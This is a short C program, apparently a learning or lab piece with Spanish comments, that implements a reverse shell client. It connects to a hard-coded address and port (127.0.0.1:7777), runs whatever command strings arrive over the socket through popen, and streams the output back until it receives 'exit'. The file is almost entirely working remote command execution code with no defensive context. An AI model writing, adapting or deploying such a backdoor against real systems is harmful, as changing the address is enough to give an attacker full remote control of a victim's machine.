#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 7777
#define SERVER_ADDR "127.0.0.1"

int execute(socket){
    char* mode_l = "Server status: listen";
    char* mode_nl = "Server status: stop-listen";
    while (1){
        char buffer[1024] = {0};
        FILE* fp;
        read(socket, buffer, 1024);
        if (!strcmp(buffer, "exit")) {
            close(socket);
            break;
        }

        fp = popen(buffer, "r");
        if (fp == NULL) {
            send(socket, "error\n", 8, 0);
            continue;
        }
        send(socket, mode_l, strlen(mode_l), 0);

        while (fgets(buffer, sizeof(buffer), fp)){
            send(socket, buffer, sizeof(buffer), 0);
        }

        send(socket, mode_nl, strlen(mode_nl), 0);
    }
}

int main(){
    int sock;
    struct sockaddr_in server_address;
    char buffer[1024] = {0};

    // Crear un socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror("Error creando el socket\n");
        exit(EXIT_FAILURE);
    }

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_ADDR, &server_address.sin_addr) == -1){
        perror("Formato incompatible\n");
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) == -1){
        perror("Error de conexion");
        exit(EXIT_FAILURE);
    }

    // Leer mensaje del servidor
    read(sock, buffer, 1024);
    printf("%s\n", buffer);

    // Default mode
    execute(sock);

    return 0;
}